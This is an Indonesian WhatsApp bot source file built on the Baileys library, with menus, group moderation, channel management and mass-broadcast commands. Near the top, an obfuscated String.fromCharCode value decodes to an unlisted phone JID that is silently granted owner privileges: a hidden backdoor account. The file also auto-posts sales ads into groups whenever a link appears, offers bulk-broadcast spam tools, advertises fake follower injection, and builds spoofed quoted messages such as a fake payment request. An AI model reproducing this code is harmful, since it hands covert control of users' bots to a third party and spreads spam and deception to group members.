/* 

=========================================================================

 HELO BG 🦅
 CREDIT : 𝐴𝑙𝑤𝑎𝑦𝑠𝑍𝑎𝑘𝑧𝑧 𝑂𝑓𝑓𝑖𝑐𝑖𝑎𝑙
 WA CIKSS : 6285817068074
 
=========================================================================

*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');

const { LoadDataBase } = require('./source/message');
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');


module.exports = Sky = async (Sky, m, chatUpdate, store) => {
	try {
await LoadDataBase(Sky, m)
const botNumber = await Sky.decodeJid(Sky.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)

const CHANNELS_FILE = "./library/savesaluran.json";

// Fungsi untuk memuat data saluran dari file
function loadChannels() {
if (fs.existsSync(CHANNELS_FILE)) {
return JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf-8"));
}
return [];
}

function saveChannels(data) {
fs.writeFileSync(CHANNELS_FILE, JSON.stringify(data, null, 2));
}

global.channels = loadChannels();
//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\n  Command :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\n  From :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//============= [ FAKEQUOTED ] ===============================================

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//============= [ EVENT GROUP ] ===============================================

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd) {
try {
let res = await axios.get(`https://simsimi.site/api/v2/?mode=talk&lang=id&message=${m.text}&filter=true`)
if (res.data.success) {
await m.reply(res.data.success)
}
} catch (e) {}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Sky.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Sky.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Sky.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await Sky.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Sky.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Sky.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Sky.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await Sky.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await Sky.sendMessage(m.chat, {text: `
*𝐀𝐥𝐰𝐚𝐲𝐬𝐙𝐚𝐤𝐳𝐳 Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.


*👤 Contact 𝐀𝐥𝐰𝐚𝐲𝐬𝐙𝐚𝐤𝐳𝐳*
* *WhatsApp Utama :*
+6285817068074
* *WhtasApp Cadangan :*
+6285817068074
T.me/zakzzhostoffc
`}, {quoted: null})
}
}


if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}

//============= [ FUNCTION ] ======================================================

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return Sky.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: null})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: Sky.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*𝐀𝐥𝐰𝐚𝐲𝐬𝐙𝐚𝐤𝐳𝐳 Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*𝐀𝐥𝐰𝐚𝐲𝐬𝐙𝐚𝐤𝐳𝐳 Menyediakan 🌟*

* Vps Digital Ocean 8GB - 16GB
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Vps Digital Ocean🌟*

_*Promo Vps Digital Ocean*_
* Ram 2 Core 2 Rp 25.000
* Ram 4 Core 2 Rp 35.000
* Ram 8 Core 4 Rp 45.000
* Ram 16 Core 4 Rp 55.000
𝘽𝙚𝙣𝙚𝙛𝙞𝙩
>̶>̶ Free Install Panel Pterodactyl
>̶>̶ Free Install Nodes+Wings
>̶>̶ Free Req Domain
>̶>̶ Free Req Os, Versi, Region
>̶>̶ Full Akses Vps
>̶>̶ Masa Aktif 30 Hari Garansi 15 Hari
>̶>̶ Free Install Thema Ram 8-16GB`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Sky.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
const skyzodev = { Sky, toIDR, isCreator, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, sleep, botNumber }
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, skyzodev)
}
}
if (!pluginsDisable) return

//========= [ COMMANDS MENU ] =================================================
switch (command) {
case "menu": {
const owned = owner + "@s.whatsapp.net";
let awal = `
sᴀʏᴏɴᴀʀᴀ 👋
sᴀʏᴀ ᴀᴅᴀʟᴀн *𝘈𝘭𝘸𝘢𝘺𝘴𝘡𝘢𝘬𝘻𝘻𝘊𝘱𝘢𝘯𝘦𝘭𝘑𝘱𝘮𝘤𝘩*. sᴀʏᴀ ᴅᴀᴘᴀт мᴇмʙᴀɴтu ᴀɴᴅᴀ sᴇsuᴀι ғιтuʀ ʏᴀɴԍ sᴀʏᴀ sᴇᴅιᴀκᴀɴ, κʟικ тoмʙoʟ ᴅι ʙᴀwᴀн uɴтuκ мᴇʟιнᴀт sᴇмuᴀ ғιтuʀ ʏᴀн κᴀκ. 

〆 ʙoтɴᴀмᴇ: Simple - Cpanel+Jpmch
〆 vᴇʀsιoɴ: 2.0.0
〆 sтᴀтus: Public
`;

Sky.sendMessage(m.chat, {
image: { url: 'https://files.catbox.moe/1039m7.jpg' },
caption: awal,
footer: `─ Runtime: *${runtime(process.uptime())}*`,
contextInfo: {
mentionedJid: [m.sender, owned],
forwardingScore: 999,
isForwarded: false,
externalAdReply: {
showAdAttribution: true,
title: `𝐙𝐚𝐤𝐳𝐳𝐗𝐁𝐨𝐭𝐳`,
body: "𝗭𝗮𝗸𝘇𝘇 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
thumbnailUrl: 'https://files.catbox.moe/s8sbsp.jpg',
mediaType: 1,
renderLargerThumbnail: false
}
},
buttons: [
{
buttonId: '.cpanelmenu',
buttonText: { displayText: 'C̸P̸A̸N̸E̸L̸ ҉M҉E҉N҉U҉' },
type: 1,
},
{
buttonId: 'action',
buttonText: { displayText: 'ini pesan interactiveMeta' },
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'A҉L҉L҉ ҉M҉E҉N҉U҉',
sections: [
{
title: botname,
highlight_label: '',
rows: [
    {
        header: '𝘼𝙇𝙇 𝙈𝙀𝙉𝙐',
        title: '𝙅𝙋𝙈𝘾𝙃 𝗭𝗮𝗸𝘇𝘇',
        description: 'Display to menu',
        id: '.allmenu'
    }
]
}
]
})
}
}
],
headerType: 1,
viewOnce: true
}, { quoted: m });
}
break;

case "jpmmenu": {
let tato = `
⏤͟͟͞͞𝙅𝙋𝙈 𝙈𝙀𝙉𝙐
❏ ✰ᴊᴘᴍ
❏ ✰ᴊᴘᴍsʟɪᴅᴇ
❏ ✰ᴊᴘᴍsʟɪᴅᴇʜɪᴅᴇᴛᴀʜ
❏ ✰ᴊᴘᴍғᴏᴛᴏ
❏ ✰ᴊᴘᴍᴛᴇsᴛɪ
❏ ✰ᴊᴘᴍᴄʜ
❏ ✰ᴊᴘᴍᴀʟʟᴄʜ`;

await Sky.sendMessage(m.chat, {
footer: `${botname}`,
buttons: [
{
buttonId: `.allmenu`,
buttonText: { displayText: '𝘼𝙇𝙇 𝙈𝙀𝙉𝙐' },
type: 1
}
],
headerType: 1,
viewOnce: true,
document: fs.readFileSync("./package.json"),
fileName: `By ${namaOwner} </>`,
mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
fileLength: 99999999,
caption: tato,
contextInfo: {
isForwarded: false,
mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
forwardedNewsletterMessageInfo: {
newsletterJid: global.idSaluran,
newsletterName: global.namaSaluran
},
externalAdReply: {
title: `${botname} - ${packname}`,
body: `📍 Runtime : ${runtime(process.uptime())}`,
thumbnailUrl: 'https://img12.pixhost.to/images/952/576587254_kyzsenpai.jpg',
sourceUrl: linkSaluran,
mediaType: 1,
renderLargerThumbnail: true,
}
}
});
}
break;


case "cpanelmenu": {
let tato = `
⏤͟͟͞͞𝗖𝗣𝗔𝗡𝗘𝗟 𝙈𝙀𝙉𝙐
❏ ✰1ɢʙ
❏ ✰2ɢʙ
❏ ✰3ɢʙ
❏ ✰4ɢʙ
❏ ✰5ɢʙ
❏ ✰6ɢʙ
❏ ✰7ɢʙ
❏ ✰8ɢʙ
❏ ✰9ɢʙ
❏ ✰10ɢʙ
❏ ✰ᴜɴʟɪ
❏ ✰ᴄᴀᴅᴍɪɴ
❏ ✰ʟɪꜱᴛᴘᴀɴᴇʟ
❏ ✰ᴅᴇʟᴘᴀɴᴇʟ
❏ ✰ᴅᴇʟᴀᴅᴍɪɴ`;

await Sky.sendMessage(m.chat, {
footer: `${botname}`,
buttons: [
{
buttonId: `.allmenu`,
buttonText: { displayText: '𝘼𝙇𝙇 𝙈𝙀𝙉𝙐' },
type: 1
}
],
headerType: 1,
viewOnce: true,
document: fs.readFileSync("./package.json"),
fileName: `By ${namaOwner} </>`,
mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
fileLength: 99999999,
caption: tato,
contextInfo: {
isForwarded: false,
mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
forwardedNewsletterMessageInfo: {
newsletterJid: global.idSaluran,
newsletterName: global.namaSaluran
},
externalAdReply: {
title: `${botname} - ${packname}`,
body: `📍 Runtime : ${runtime(process.uptime())}`,
thumbnailUrl: 'https://img12.pixhost.to/images/952/576587254_kyzsenpai.jpg',
sourceUrl: linkSaluran,
mediaType: 1,
renderLargerThumbnail: true,
}
}
});
}
break;

case "allmenu": {
let teks = `
⏤͟͟͞͞ 𝙊𝙏𝙃𝙀𝙍 𝙈𝙀𝙉𝙐
❏ ✰ᴄᴇᴋɪᴅɢᴄ
❏ ✰ᴄᴇᴋɪᴅᴄʜ

⏤͟͟͞͞𝗖𝗣𝗔𝗡𝗘𝗟 𝙈𝙀𝙉𝙐
❏ ✰1ɢʙ
❏ ✰2ɢʙ
❏ ✰3ɢʙ
❏ ✰4ɢʙ
❏ ✰5ɢʙ
❏ ✰6ɢʙ
❏ ✰7ɢʙ
❏ ✰8ɢʙ
❏ ✰9ɢʙ
❏ ✰10ɢʙ
❏ ✰ᴜɴʟɪ
❏ ✰ᴄᴀᴅᴍɪɴ
❏ ✰ʟɪꜱᴛᴘᴀɴᴇʟ
❏ ✰ᴅᴇʟᴘᴀɴᴇʟ
❏ ✰ᴅᴇʟᴀᴅᴍɪɴ

⏤͟͟͞͞𝗖𝗣𝗔𝗡𝗘𝗟 𝙈𝙀𝙉𝙐-𝗩𝟮
❏ ✰1ɢʙ--ᴠ2
❏ ✰2ɢʙ-ᴠ2
❏ ✰3ɢʙ-ᴠ2
❏ ✰4ɢʙ-ᴠ2
❏ ✰5ɢʙ-ᴠ2
❏ ✰6ɢʙ-ᴠ2
❏ ✰7ɢʙ-ᴠ2
❏ ✰8ɢʙ-ᴠ2
❏ ✰9ɢʙ-ᴠ2
❏ ✰10ɢʙ-ᴠ2
❏ ✰ᴜɴʟɪ-ᴠ2
❏ ✰ᴄᴀᴅᴍɪɴ-ᴠ2
❏ ✰ʟɪꜱᴛᴘᴀɴᴇʟ-ᴠ2
❏ ✰ᴅᴇʟᴘᴀɴᴇʟ-ᴠ2
❏ ✰ᴅᴇʟᴀᴅᴍɪɴ-ᴠ2

⏤͟͟͞͞𝙅𝙋𝙈 𝙈𝙀𝙉𝙐
❏ ✰ᴊᴘᴍ
❏ ✰ᴊᴘᴍsʟɪᴅᴇ
❏ ✰ᴊᴘᴍsʟɪᴅᴇʜɪᴅᴇᴛᴀʜ
❏ ✰ᴊᴘᴍғᴏᴛᴏ
❏ ✰ᴊᴘᴍᴛᴇsᴛɪ
❏ ✰ᴊᴘᴍᴄʜ
❏ ✰ᴊᴘᴍᴀʟʟᴄʜ
❏ ✰ᴊᴘᴍʜᴛ

⏤͟͟͞͞𝙂𝙍𝙊𝙐𝙋 𝙈𝙀𝙉𝙐
❏ ✰ᴀᴅᴅ
❏ ✰ᴋɪᴄᴋ
❏ ✰ᴄʟᴏsᴇ
❏ ✰ᴏᴘᴇɴ
❏ ✰ʜɪᴅᴇᴛᴀɢ
❏ ✰ᴋᴜᴅᴇᴛᴀɢᴄ
❏ ✰ʟᴇᴀᴠᴇ
❏ ✰ᴘʀᴏᴍᴏᴛᴇ
❏ ✰ʀᴇsᴇᴛʟɪɴᴋɢᴄ
❏ ✰ʟɪɴᴋɢᴄ

⏤͟͟͞͞𝙊𝙒𝙉𝙀𝙍 𝙈𝙀𝙉𝙐
❏ ✰ᴀᴅᴅᴏᴡɴᴇʀ
❏ ✰ᴅᴇʟᴏᴡɴᴇʀ
❏ ✰ᴀᴅᴅꜱᴇʟʟᴇʀ
❏ ✰ᴅᴇʟꜱᴇʟʟᴇʀ
❏ ✰ʟɪsᴛᴏᴡɴᴇʀ
❏ ✰ʟɪꜱᴛꜱᴇʟʟᴇʀ
❏ ✰sᴇʟғ/ᴘᴜʙʟɪᴄ
❏ ✰ᴀᴅᴅɢʀᴏᴜᴘʀᴇꜱᴇʟʟᴇʀ
❏ ✰ᴅᴇʟɢʀᴏᴜᴘʀᴇꜱᴇʟʟᴇʀ
❏ ✰ʟɪꜱᴛɢʀᴏᴜᴘʀᴇꜱᴇʟʟᴇʀ
❏ ✰ᴄʟᴇᴀʀsᴇssɪᴏɴ
❏ ✰ᴀᴅᴅɪᴅᴄʜ
❏ ✰ᴅᴇʟɪᴅᴄʜ
❏ ✰ʟɪsᴛɢᴄ
❏ ✰ᴊᴏɪɴɢᴄ
❏ ✰ᴊᴏɪɴ ᴄʜ`;

await Sky.sendMessage(m.chat, {
footer: `${botname}`,
buttons: [
{
buttonId: `.allmenu`,
buttonText: { displayText: '𝘼𝙇𝙇 𝙈𝙀𝙉𝙐' },
type: 1
}
],
headerType: 1,
viewOnce: true,
document: fs.readFileSync("./package.json"),
fileName: `By ${namaOwner} </>`,
mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
fileLength: 99999999,
caption: teks,
contextInfo: {
isForwarded: false,
mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
forwardedNewsletterMessageInfo: {
newsletterJid: global.idSaluran,
newsletterName: global.namaSaluran
},
externalAdReply: {
title: `${botname} - ${packname}`,
body: `📍 Runtime : ${runtime(process.uptime())}`,
thumbnailUrl: 'https://img12.pixhost.to/images/952/576587254_kyzsenpai.jpg',
sourceUrl: linkSaluran,
mediaType: 1,
renderLargerThumbnail: true,
}
}
});
}
break;
}



//============= [ COMMANDS ] ====================================================

switch (command) {
case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await Sky.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Sky.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//================================================================================

case "addidch": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply("Harap masukkan link saluran!");

    let channelLink = text.trim();

    if (!channelLink.includes("https://whatsapp.com/channel/")) {
        return m.reply("Link saluran tidak valid! Harus berupa link WhatsApp (https://whatsapp.com/channel/...)");
    }

    let channelId = channelLink.split("https://whatsapp.com/channel/")[1];
    if (!channelId) return m.reply("Gagal mengekstrak ID dari link saluran!");

    try {
        let res = await Sky.newsletterMetadata("invite", channelId);

        if (!res.id) return m.reply("ID saluran tidak valid!");

        global.channels = loadChannels();

        if (global.channels.includes(res.id)) {
            return m.reply(`ID Saluran *${res.id}* sudah terdaftar!`);
        }

        global.channels.push(res.id);
        saveChannels(global.channels);

        m.reply(`Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\nNama Saluran: ${res.name}`);
    } catch (e) {
        console.error(e);
        m.reply("Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
    }
}
break

//================================================================================

case "delidch": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply("Harap masukkan nomor atau ID saluran yang ingin dihapus!");

    global.channels = loadChannels();

    if (!isNaN(text)) {
        let index = parseInt(text.trim()) - 1;

        if (index < 0 || index >= global.channels.length) {
            return m.reply("Nomor urut tidak valid!");
        }

        let removed = global.channels.splice(index, 1);
        saveChannels(global.channels);

        m.reply(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
    } else {
        let channelId = text.trim();

        if (!global.channels.includes(channelId)) {
            return m.reply("ID Saluran tidak ditemukan!");
        }

        global.channels = global.channels.filter((id) => id !== channelId);
        saveChannels(global.channels);

        m.reply(`Berhasil menghapus ID Saluran: *${channelId}*`);
    }
}
break;

case "ListidZakzz": {
    if (!isCreator) return m.reply(mess.owner);

    global.channels = loadChannels();

    if (global.channels.length === 0) {
        return m.reply("Belum ada ID saluran yang terdaftar!");
    }

    let list = global.channels
        .map((id, index) => `${index + 1}. ${id}`)
        .join("\n");

    m.reply(`Daftar ID Saluran Terdaftar:\n\n${list}`);
}
break

//================================================================================

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Sky.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Sky.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//================================================================================

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
